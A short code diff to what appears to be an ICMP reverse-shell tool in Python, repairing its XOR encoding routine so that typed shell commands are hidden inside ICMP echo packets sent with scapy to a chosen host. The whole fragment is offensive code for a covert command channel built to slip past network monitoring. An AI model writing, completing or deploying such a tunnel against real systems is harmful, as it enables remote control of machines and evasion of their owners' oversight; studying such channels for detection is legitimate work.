@@ -10,11 +10,12 @@ import argparse
 ICMP_ID = int(13170)
 TTL = int(64)
 
-def enc(payload, xorkey:bytes) -> bytearray:
-    ret_payload = xorkey
-    for i in range(0, len(payload)):
-        ret_payload += payload[i] ^ xorkey
-    return payload
+def enc(payload, xorkey):
+    arr_payload = bytes(payload, 'utf-8')
+    ret_payload = []
+    for byte in arr_payload:
+        ret_payload.append(byte ^ xorkey)
+    return ret_payload
 
 def check_scapy():
     try:
@@ -50,7 +51,7 @@ def main():
         elif icmpshell == '':
             pass
         else:
-            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=enc(icmpshell, b'\x13')))
+            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=enc(icmpshell, 0x13)))
             sr(payload, timeout=0, verbose=0)
     sniffing.join()
 
